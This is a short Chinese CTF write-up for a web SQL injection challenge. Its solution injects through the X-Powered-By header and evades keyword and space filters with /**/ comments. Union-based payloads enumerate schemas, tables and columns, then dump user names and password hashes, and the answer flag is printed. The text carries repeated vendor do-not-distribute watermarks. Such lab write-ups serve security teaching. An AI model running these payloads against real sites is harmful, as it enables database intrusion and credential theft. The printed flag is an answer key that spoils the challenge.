# sql注入2 wp

# sql注入2_wp
---

<!-- page 1 -->

Writeup 
 
1：Web-sql 注入 
题目难度：中等 
建议分值：200 分 
题目说明：简单爆破？提交flag 格式：flag{xxxx}。 
Flag：flag{7209f791932284ddc0189a6ad0a365a1} 
解题过程： 
 
访问看到首页，登录框，尝试登录会有干扰提示，强口令，几乎不可能爆破出来 
抓包 
 
发现X-Powered-By 字段值异常，尝试在该字段构造注入 
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 2 -->

存在对select/union/order/空格/table 的过滤 
X-Powered-By:-1'/**/Union/**/Select/**/1,group_concat(schema_name),3,4/**/from/**/infor
mation_schema.schemata# 
 
-1'/**/Union/**/Select/**/1,group_concat(Table_name),3,4/**/from/**/information_schema.Tables
/**/where/**/Table_schema=’sqlinject’# 
-1'/**/Union/**/Select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.colu
mns/**/where/**/Table_name=’users’# 
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 3 -->

 
-1'/**/Union/**/Select/**/1,group_concat(name,0x7C,password),3,4/**/from/**/users# 
密码是md5 加密，干扰项，解密后反而不能登录，直接使用登录 
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 4 -->

 
Flag 是flag{7209f791932284ddc0189a6ad0a365a1}。 
 
 
 
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁
